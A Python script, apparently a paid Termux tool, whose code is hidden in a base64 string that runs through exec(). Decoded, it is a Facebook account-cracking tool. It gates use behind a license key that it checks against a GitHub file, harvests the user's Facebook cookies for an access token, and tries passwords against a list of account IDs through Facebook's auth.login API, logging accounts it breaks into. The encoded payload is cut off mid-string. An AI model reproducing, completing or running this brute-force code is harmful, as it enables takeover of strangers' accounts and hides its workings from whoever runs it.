# Encrypted by MAHDI HASAN SHUVO
# Whatsapp +8801616406924  
# facebook;https://www.facebook.com/bk4human

import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zCiMtKi1jb2Rpbmc6dXRmLTgtKi0KIyBVcGRhdGUgVjEuNgoKIyMjIEltcG9ydCBNb2R1bGUKaW1wb3J0IG9zCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBwcmludCgnXG4gTW9kdWxlIHJlcXVlc3RzICEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykKCnRyeToKICAgIGltcG9ydCBjb25jdXJyZW50LmZ1dHVyZXMKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoJ1xuIE1vZHVsZSBmdXR1cmVzICEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGZ1dHVyZXMnKQogICAgb3Muc3lzdGVtKCd0ZXJtdXgtc2V0dXAtc3RvcmFnZScpCgp0cnk6CiAgICBpbXBvcnQgYnM0CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIHByaW50KCdcbiBNb2R1bGUgYnM0ICEuLi5cbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGJzNCcpCgppbXBvcnQgcmVxdWVzdHMsIG9zLCByZSwgYnM0LCBzeXMsIGpzb24sIHRpbWUsIHJhbmRvbSwgZGF0ZXRpbWUsIHN1YnByb2Nlc3MsIHRocmVhZGluZywgaXRlcnRvb2xzLGJhc2U2NCx1dWlkCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgQmlsYWxCU04KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAKCgpjdCA9IGRhdGV0aW1lLm5vdygpCm4gPSBjdC5tb250aApidWxhbiA9IFsnSmFudWFyaScsICdGZWJydWFyaScsICdNYXJldCcsICdBcHJpbCcsICdNZWknLCAnSnVuaScsICdKdWxpJywgJ0FndXN0dXMnLCAnU2VwdGVtYmVyJywgJ09rdG9iZXInLCAnTm92ZW1iZXInLCAnRGVzZW1iZXInXQp0cnk6CiAgICBpZiBuIDwgMCBvciBuID4gMTI6CiAgICAgICAgZXhpdCgpCiAgICBuVGVtcCA9IG4gLSAxCmV4Y2VwdCBWYWx1ZUVycm9yOgogICAgZXhpdCgpCgpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkKdGEgPSBjdXJyZW50LnllYXIKYnUgPSBjdXJyZW50Lm1vbnRoCmhhID0gY3VycmVudC5kYXkKb3AgPSBidWxhbltuVGVtcF0KIyMjIFdBUk5BIFJBTkRPTSAjIyMKUCA9ICdceDFiWzE7OTdtJyAjIFBVVElICk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSApIID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUKSyA9ICdceDFiWzE7OTNtJyAjIEtVTklORwpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQpVID0gJ1x4MWJbMTs5NW0nICMgVU5HVQpPID0gJ1x4MWJbMTs5Nm0nICMgQklSVSBNVURBCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJCm15X2NvbG9yID0gWwogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQojICBDSElHT1pJRVdPUkxEV0lERS4gICMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0+CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIFJFU1BPTlNFIEZBQ0VCT09LICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZGF0YSxkYXRhMj17fSx7fQphbWFuLGNwLHNhbGFoPTAsMCwwCnViYWhQLHB3QmFydT1bXSxbXQpvayA9IFtdCmNwID0gW10KaWQgPSBbXQp1c2VyID0gW10KbG9vcCA9IDAKdXJsX2xvb2t1cCA9ICJodHRwczovL2xvb2t1cC1pZC5jb20vIgp1cmxfbWIgPSAiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbSIKdXJsX2lwID0gImh0dHBzOi8vd3d3Lmh0dHBiaW4ub3JnL2lwIgpoZWFkZXJfZ3J1cCA9IHsidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10ifQpidWxhbl90dGwgPSB7IjAxIjogIkphbnVhcnkiLCAiMDIiOiAiRmVicnVhcnkiLCAiMDMiOiAiTWFyY2giLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWF5IiwgIjA2IjogIkp1bmUiLCAiMDciOiAiSnVseSIsICIwOCI6ICJBdWd1c3R1cyIsICIwOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9CiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZG9uZSA9IEZhbHNlCmRlZiBhbmltYXRlKCk6CiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIGZvciBjIGluIGl0ZXJ0b29scy5jeWNsZShbJ1x4MWJbMTs5Mm18JywgJ1x4MWJbMTs5Mm0vJywgJ1x4MWJbMTs5Mm0tJywgJ1x4MWJbMTs5Mm1cXCddKToKICAgICAgICBpZiBkb25lOgogICAgICAgICAgICBicmVhawogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidccntOfVt7T33DouKCrMKie059XSBMb2FkaW5nICcgKyBjKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMykKdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWFuaW1hdGUpCnQuc3RhcnQoKQp0aW1lLnNsZWVwKDAuNSkKZG9uZSA9IFRydWUKCiMgbGVtcGFua2tra2tra2sKZGVmIGphbGFuKHopOgogICAgZm9yIGUgaW4geiArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKCiMgTE8gS09OVE9MCmRlZiBsb2dvKCk6CglwcmludCgiIiIlcwogICAgICAgICAgIFwwMzNbMDszN20gIyMgICAgICMjICAgICMjIyAgICAjIyAgICAgIyMgIyMjIyMjIyMgICMjIyMgCiAgICAgICAgICAgXDAzM1sxOzkybSAjIyMgICAjIyMgICAjIyAjIyAgICMjICAgICAjIyAjIyAgICAgIyMgICMjCiAgICAgICAgICAgXDAzM1sxOzkzbSAjIyMjICMjIyMgICMjICAgIyMgICMjICAgICAjIyAjIyAgICAgIyMgICMjICAKICAgICAgICAgICBcMDMzWzE7OTFtICMjICMjIyAjIyAjIyAgICAgIyMgIyMjIyMjIyMjICMjICAgICAjIyAgIyMKICAgICAgICAgICBcMDMzWzE7OTJtICMjICAgICAjIyAjIyMjIyMjIyMgIyMgICAgICMjICMjICAgICAjIyAgIyMKICAgICAgICAgICBcMDMzWzE7OTNtICMjICAgICAjIyAjIyAgICAgIyMgIyMgICAgICMjICMjICAgICAjIyAgIyMgIAogICAgICAgICAgIFwwMzNbMTszM20gIyMgICAgICMjICMjICAgICAjIyAjIyAgICAgIyMgIyMjIyMjIyMgICMjIyMKICAgICAgICAgICAgIFwwMzNbMTs5Nm3ilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilocKICAgICAgICAgICAgIFwwMzNbMTs5M23ilofilofinqMgICAgXDAzM1sxOzkxbUFVVEhPUiAgIDogTUFIREkgSEFTQU4gICAgICAgIFwwMzNbMTs5M23ilofilocKICAgICAgICAgICAgIFwwMzNbMTs5M23ilofilofinqMgICAgXDAzM1sxOzk0bUdJVEhVQiAgIDogTUFIREkgSEFTQU4gICAgICAgIFwwMzNbMTs5M23ilofilocKICAgICAgICAgICAgIFwwMzNbMTs5M23ilofilofinqMgICAgXDAzM1sxOzkzbUZBQ0VCT09LIDogTUFIREkgSEFTQU4gICAgICAgIFwwMzNbMTs5M23ilofilocKICAgICAgICAgICAgIFwwMzNbMTs5M23ilofilofinqMgICAgXDAzM1sxOzkybVdIQVRTQVBQIDogKzg4MDE2MTY0MDY5MjQgICAgIFwwMzNbMTs5M23ilofilocKICAgICAgICAgICAgIFwwMzNbMTs5M23ilofilofinqMgICAgICAgXDAzM1sxOzkxbVRISVMgVE9PTCBJUyBQQUlEICAgICAgICAgIFwwMzNbMTs5M23ilofilocKICAgICAgICAgICAgIFwwMzNbMTs5M23ilofilofinqMgICAgXDAzM1sxOzk0bUdJVkUgTUUgMTAwIHRrIEZPUiBBUFJWQUwgICAgIFwwMzNbMTs5M23ilofilocKICAgICAgICAgICAgIFwwMzNbMTs5Nm3ilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilofilocKICAgICAgICAgICAgIAoKIiIiJShPKSkKCmRlZiBtYWhkaSgpOgogICAgb3Muc3lzdGVtKCd0ZXJtdXgtc2V0dXAtc3RvcmFnZScpCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2JrNGh1bWFuJykKICAgIGxvZ28oKQogICAgcHJpbnQgKCcnKQogICAgcHJpbnQgKCcgICAgICAgICAgICAgICAgICAgICBDaGVja2luZyBBcHByb3ZhbCcpCiAgICB0aW1lLnNsZWVwKDEpIAogICAgdHJ5OgogICAgICAgIHRvID0gb3BlbignL3NkY2FyZC9BbmRyb2lkLy5iczdudC50eHQnLCAncicpLnJlYWQoKQogICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgcmVnMigpCiAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vU2h1dm8tQkJISC9GSUxFL21haW4vYXAudHh0JykudGV4dAogICAgaWYgdG8gaW4gcjoKICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgYnNuX21lbnUoKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9iazRodW1hbicpCiAgICAgICAgbG9nbygpCiAgICAgICAgcHJpbnQoJycpCiAgICAgICAgcHJpbnQgKCcgICAgICAgICAgICAgICBcdEFwcHJvdmVkIE5vdCBEZXRlY3RlZCcpCiAgICAgICAgcHJpbnQgKCcnKQogICAgICAgIHByaW50KCIgICAgICAgICAgICBcMDMzWzE7OTdtVEhJUyBUT09MIElTIFBBSUQgWU9VIE5FRUQgVE8gR0VUIEFQUFJPVkVEIEZJUlNUIikKICAgICAgICBwcmludCAoJyAgICAgICAgICAgICAgIFwwMzNbMTs5N21ZT1VSIEtFWSA6ICcgKyB0bykKICAgICAgICBwcmludCgiICAgICAgICAgICAgICAgQ09QWSBBTkQgU0VORCBLRVkgVE8gQURNSU4iKQogICAgICAgIG5hbWUgPSBpbnB1dCgiICAgICAgICAgICAgICAgWU9VUiBOQU1FIDogIikKICAgICAgICBpbnB1dCgnXDAzM1sxOzk3bSAgICAgICAgICAgICAgIFBSRVNTIEVOVEVSICBUTyBTRU5EIFRPS0VOJykKICAgICAgICB0aW1lLnNsZWVwKDMuNSkKICAgICAgICB0a3MgPSAnRGVhciUyMEFkbWluLCUyMFBsZWFzZSUyMEFwcHJvdmVkJTIwTXklMjBLZXklMjBUbyUyMFByZW1pdW0lMjAlMjBUaGFua3MlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBNeSUyME5hbWUlMjA6JTIwJytuYW1lKyclMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBNeSUyMCUyMEtleSUyMCUyMDolMjAnK3RvCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys4ODAxNjE2NDA2OTI0P3RleHQ9JyArIHRrcykKICAgICAgICByZWcoKQoKZGVmIHJlZzIoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgbG9nbygpCiAgICBwcmludCgnJykKICAgIHByaW50ICgnXHRBcHByb3ZhbCBOb3QgRGV0ZWN0ZWQnKQogICAgcHJpbnQoJycpCiAgICBpZCA9IHV1aWQudXVpZDQoKS5oZXhbOjUwXQogICAgcHJpbnQoIiAgICAgICAgICAgIFwwMzNbMTs5N21USElTIFRPT0wgSVMgUEFJRCBZT1UgTkVFRCBUTyBHRVQgQVBQUk9WRUQgRklSU1QiKQogICAgcHJpbnQgKCcgICAgICAgICAgICAgICBcMDMzWzE7OTdtWU9VUiBLRVkgOiAnICsgaWQpCiAgICBwcmludCgiICAgICAgICAgICAgICAgQ09QWSBBTkQgU0VORCBLRVkgVE8gQURNSU4iKQogICAgbmFtZSA9IGlucHV0KCIgICAgICAgICAgICAgICBZT1VSIE5BTUUgOiAiKQogICAgaW5wdXQoJ1wwMzNbMTs5N20gICAgICAgICAgICAgICBQUkVTUyBFTlRFUiAgVE8gU0VORCBUT0tFTicpCiAgICB0aW1lLnNsZWVwKDMuNSkKICAgIHRrcyA9ICdEZWFyJTIwTUFIREktc2lyLCUyMFBsZWFzZSUyMEFwcHJvdmVkJTIwTXklMjBLZXklMjBUbyUyMFByZW1pdW0lMjAlMjBUaGFua3MlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBNeSUyME5hbWUlMjA6JTIwJytuYW1lKyclMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBNeSUyMCUyMEtleSUyMCUyMDolMjAnK2lkCiAgICBvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzg4MDE2MTY0MDY5MjQ/dGV4dD0nICsgdGtzKQogICAgc2F2ID0gb3BlbignL3NkY2FyZC9BbmRyb2lkLy5iczdudC50eHQnLCAndycpCiAgICBzYXYud3JpdGUoaWQpCiAgICBzYXYuY2xvc2UoKQogICAgcmVnKCkKCgoKI01BU1VLIFRPS0VOCmRlZiBjaGlnb3ppZSgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAoJyAlcyolcyB0b29scyBpbmkgbWVuZ2d1bmFrYW4gbG9naW4gY29va2llcyBmYWNlYm9vay5cbiAlcyolcyBhcGFrYWgga2FtdSBzdWRhaCB0YXUgY2FyYSBtZW5kYXBhdGthbiBjb29raWVzIGZhY2Vib29rP1xuICVzKiVzIGtldGlrIG9wZW4gdW50dWsgbWVuZGFwYXRrYW4gY29va2llcyclKE8sTixPLE4sTyxOKSkKICAgIGNvb2tpZSA9IGlucHV0KCJcbiAlc1slcz8lc10gQ29va2llcyA6ICVzIiUgKE8sTyxPLE8pKQogICAgaWYgY29va2llIGluWydPUEVOJywnT3BlbicsJ29wZW4nXToKICAgICAgamFsYW4oIlxuICAlcyogJXNhbmRhIGFrYW4gZGkgYXJhaGthbiBrZSBZb3VUdWJlIiUoTyxPKSk7dGltZS5zbGVlcCgzKTtvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzg4MDE2MTY0MDY5MjQnKTtjaGlnb3ppZSgpCiAgICB0cnk6CiAgICAgICAgaGVhZD17J0hvc3QnOididXNpbmVzcy5mYWNlYm9vay5jb20nLCdjYWNoZS1jb250cm9sJzonbWF4LWFnZT0wJywndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6JzEnLCd1c2VyLWFnZW50JzonTW96aWxsYS81LjAgKEFuZHJvaWQ7IE1vYmlsZTsgcnY6NDAuMCkgR2Vja28vNDAuMCBGaXJlZm94LzQwLjAnLCdhY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLCdjb250ZW50LXR5cGUnIDogJ3RleHQvaHRtbDsgY2hhcnNldD11dGYtOCcsJ2FjY2VwdC1lbmNvZGluZyc6J2d6aXAsIGRlZmxhdGUgYnInLCdhY2NlcHQtbGFuZ3VhZ2UnOidpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsJ2Nvb2tpZSc6IGNvb2tpZX0KICAgICAgICBhc3d3PXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vY3JlYXRvcnN0dWRpby9ob21lIiwgaGVhZGVycz1oZWFkKQogICAgICAgIHJlcXE9cmUuc2VhcmNoKCd7ImFjY2Vzc1Rva2VuIjoiKEVBQVx3KyknLCBhc3d3LnRleHQpCiAgICAgICAgdG9rbj1yZXFxLmdyb3VwKDEpCiAgICAgICAgb3BlbignLmNva2llLnR4dCcsICdhJykud3JpdGUoY29va2llKQogICAgICAgIG9wZW4oJy50b2tlbi50eHQnLCAnYScpLndyaXRlKHRva24pCiAgICAgICAgbmFtYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPSVzJyUodG9rbikpLmpzb24oKVsnbmFtZSddCiAgICAgICAgcHJpbnQoJ1xuXG4gJXMqJXMgc2VsYW1hdCBkYXRhbmcgJXMlcyVzJyUoTyxPLE8sbmFtYSxPKSk7dGltZS5zbGVlcCgyKQogICAgICAgIHByaW50KCcgJXMqJXMgbW9ob24gdW50dWsgbWVuZ2d1bmFrYW4gc2MgaW5pIHNld2FqYXJueWEsIGthbWkgdGlkYWsgYmVydGFuZ2d1bmcgamF3YWIgamlrYSBzYyBpbmkgZGlzYWxhaCBndW5ha2FuLi4uJyUoTyxPKSk7dGltZS5zbGVlcCgyKQogICAgICAgIGlucHV0KCcgJXMqJXMgdGVrYW4gZW50ZXIgJyUoTyxPKSkKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzg4MDE2MTY0MDY5MjQnKQogICAgICAgIGJzbl9tZW51KCkKICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoKICAgICAgICBwcmludCgnXG4gJXNbJXPDg+KAlCVzXSBjb29raWVzIGludmFsaWQnJShPLE8sTykpO3RpbWUuc2xlZXAoMSk7Y2hpZ296aWUoKQogICAgZXhjZXB0IFVuYm91bmRMb2NhbEVycm9yOgogICAgICAgIHByaW50KCdcbiAlc1slc8OD4oCUJXNdIGNvb2tpZXMgaW52YWxpZCclKE8sTyxPKSk7dGltZS5zbGVlcCgxKTtjaGlnb3ppZSgpCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgZXhpdCgnXG5cbiAlc1slcyElc10gdGlkYWsgYWRhIGtvbmVrc2lcbiclKE8sTyxPKSkKIyMjIE9SQU5HIEdBTlRFTkcgIyMjCmRlZiBoYXNpbChPSyxjcCk6CiAgICBpZiBsZW4oT0spICE9IDAgb3IgbGVuKGNwKSAhPSAwOgogICAgICAgIHByaW50KCdcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQogICAgICAgIHByaW50KCcgWW91ciBQcm9jZXNzIENvbXBsZXRlLi4uJykKICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCiAgICAgICAgcHJpbnQoJyBbJXMrJXNdIFwwMzNbMTs5N21UT1RBTCBPSyA6ICVzIC0tLSBcMDMzWzE7OTdtQWRmLW9rLnR4dCclKE8sTyxzdHIobGVuKG9rKSkpKQogICAgICAgIHByaW50KCcgWyVzKyVzXSBcMDMzWzE7OTdtVE9UQUwgQ1AgOiAlcyAtLS0gXDAzM1sxOzk3bUFkZi1jcC50eHQnJShPLE8sc3RyKGxlbihjcCkpKSkKICAgICAgICBwcmludCgnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCiAgICAgICAgaW5wdXQoZiJcblwwMzNbMTs5N20gUHJlc3MgRW50ZXIgVG8gR28gQmFjayAiKQogICAgICAgIGJzbl9tZW51KCkKCmRlZiBic25fbWVudSgpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBsb2dvKCkKICAgIGlwbSA9IHJlcXVlc3RzLmdldCh1cmxfaXApLmpzb24oKSAKICAgIElQID0gaXBtWyJvcmlnaW4iXQogICAgcHJpbnQoIiAgICAgICAgICAgICBbKl0uIENSRUFURUQgQlkgOiBNQUhESSBIQVNBTiBTSFVWTyIpO3RpbWUuc2xlZXAgKDAuMDMpCiAgICBwcmludCgiICAgICAgICAgICAgIFsqXS4gRkFDRUJPT0sgICA6IE1BSERJIEhBU0FOIik7dGltZS5zbGVlcCAoMC4wMykKICAgIHByaW50KCIgICAgICAgICAgICAgWypdLiBHSVRIVUIgICAgIDogTUFIREkgSEFTQU4iKTt0aW1lLnNsZWVwICgwLjAzKSAgIAogICAgcHJpbnQoIiAgICAgICAgICAgICBbKl0uIFZFUlNJT04gICAgOiAyLjUuNiIpO3RpbWUuc2xlZXAgKDAuMDMpCiAgICBwcmludCgiICAgICAgICAgICAgIFsqXS4gVE9PTCBUWVBFICA6IFBBSUQiKTt0aW1lLnNsZWVwICgwLjAzKQogICAgcHJpbnQoIiAgICAgICAgICAgICBbKl0uIElQIEFERFJFU1MgOiBbJXNdXG4iJShJUCkpO3RpbWUuc2xlZXAoMC4wMSkKICAgIHByaW50KCIgICBcMDMzWzE7OTdtICAgICAgICAgICAgICBNZW51IikKICAgIHByaW50KCItLS0tLS0tLS0tLS0tLS0tLT1cPC0tLS0tLS0tLS0tLS0tLS0tLSIpCiAgICBwcmludCgiIFsxXSBGaWxlIENsb25pbmciKQogICAgcHJpbnQoIiBbMF0gRXhpdCIpCiAgICBwcmludCgiIikKICAgIHBlcGVrID0gaW5wdXQoJyBTZWxlY3QgOiAnKQogICAgaWYgcGVwZWsgaW5bJzEnLCcwMSddOgogICAgICAgIF9fYnNuX18oKS5iaWxvKGlkKQogICAgICAgICAKCmNsYXNzIF9fYnNuX186CgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuaWQgPSBbXQoKICAgIGRlZiBiaWxvKHNlbGYsaWQpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIGxvZ28oKQogICAgICAgIHByaW50KCIgICAgICAgICAgICAgIGZpbGUgY3JhY2sgbWVudSIpCiAgICAgICAgcHJpbnQoJyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKICAgICAgICBwcmludCgnJykKICAgICAgICBzZWxmLmNudCA9IGlucHV0KCclcyBbK10gZmlsZSBuYW1lIDolcyAnJShQLEspKQogICAgICAgIHNlbGYuaWQgPSBvcGVuKHNlbGYuY250KS5yZWFkKCkuc3BsaXRsaW5lcygpCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgbG9nbygpCiAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgX19fd29ybGR3aWRlX19fID0gKCd5JykKICAgICAgICBpZiBfX193b3JsZHdpZGVfX18gaW4gKCd5ZXMnLCdZZXMnLCdZJywgJ3knKToKICAgICAgICAgICAgbG9nbygpCiAgICAgICAgICAgIHByaW50KCIgICAgICAgICAgICAgIE1ldGhvZCBNZW51IikKICAgICAgICAgICAgcHJpbnQoJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQogICAgICAgICAgICBwcmludCgnJykKICAgICAgICAgICAgcHJpbnQoJyBbK10gTWV0aG9kIDEnKQogICAgICAgICAgICBwcmludCgnIFsrXSBNZXRob2QgMicpCiAgICAgICAgICAgIHByaW50KCcgWytdIE1ldGhvZCAzIChCZXN0KScpCiAgICAgICAgICAgIHBlcGVrID0gaW5wdXQoJyBTZWxlY3QgOiAnKQogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgnIENob29zZSBDb3JyZWN0IE9uZScpO3NlbGYuYmlsbyhpZCkKCiAgICBkZWYgX19hcGlfXyhzZWxmLCB1c2VyLCBfX2NoaV9fKToKICAgICAgICBnbG9iYWwgb2ssY3AsbG9vcAogICAgICAgIGZvciBpIGluIGxpc3QoJ1x8LS8nKToKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyIFtGQUhJTV0ge2xvb3B9L3tsZW4oc2VsZi5pZCl9IC0tIE9LOi0ge2xlbihvayl9IC0gQ1A6LSB7bGVuKGNwKX0gJyksCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIGZvciBwdyBpbiBfX2NoaV9fOgogICAgICAgICAgICBwdyA9IHB3Lmxvd2VyKCkKICAgICAgICAgICAgdHJ5OiBvcy5ta2RpcigncmVzdWx0cycpCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgICAgICBwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9Iit1c2VyKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrcHcrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpLmpzb24oKQogICAgICAgICAgICBpZiAiYWNjZXNzX3Rva2VuIiBpbiBwOgogICAgICAgICAgICAgICAgcHJpbnQoJ1xyIFtPSy1NQUhESV0gJXMgfCAlcyAnICUgKHVzZXIscHcpKQogICAgICAgICAgICAgICAgd3J0ID0gJyVzfCVzJyAlICh1c2VyLHB3KQogICAgICAgICAgICAgICAgb2suYXBwZW5kKHdydCkKICAgICAgICAgICAgICAgIG9wZW4oJ2ZhaGltLW9rLnR4dCcgLCAnYScpLndyaXRlKCclc1xuJyAlIHdydCkKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHBbImVycm9yX21zZyJdOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGtvbnRvbCA9IG9wZW4oJy50b2tlbi50eHQnKS5yZWFkKCkKICAgICAgICAgICAgICAgICAgICBjcF90dGwgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1iaXJ0aGRheSZhY2Nlc3NfdG9rZW49JXMnJSh1c2VyLGtvbnRvbCkpLmpzb24oKVsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgICAgIG1vbnRoLCBkYXksIHllYXIgPSBjcF90dGwuc3BsaXQoJy8nKQogICAgICAgICAgICAgICAgICAgIG1vbnRoID0gYnVsYW5fdHRsW21vbnRoXQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcciVzIFwwMzNbMTs5MW1bQ1AtTUF